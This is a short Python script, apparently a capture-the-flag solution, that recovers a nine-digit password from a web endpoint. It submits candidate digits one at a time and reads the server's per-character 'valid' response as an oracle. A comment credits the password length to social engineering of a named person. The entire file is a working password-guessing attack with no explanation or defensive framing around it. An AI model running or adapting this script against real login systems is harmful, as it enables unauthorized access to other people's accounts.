import requests
from tqdm import tqdm

url = 'http://hierophant-project.website'

password_len = 9 # By social engineering Vincent55
digits = "0123456789"
password = ""

def guess_password(now_pass):
    session = requests.Session()
    for digit in now_pass:
        data = {'c': digit}
        response = session.post(url, data=data)
        
        if response.status_code == 200:
            response_json = response.json()
            # print(response_json)
            if response_json.get('valid', True):
                continue
            else:
                return False
    return True

for i in tqdm(range(password_len), desc="Password position"):
    for digit in tqdm(digits, desc=f"Trying digit at position {i+1}", leave=False):
        attempt = password + digit
        if guess_password(attempt):
            password += digit
            tqdm.write(f"Found digit at position {i+1}: {digit}")
            tqdm.write(f"Current password: {password}")
            break

print(f"Final password found: {password}")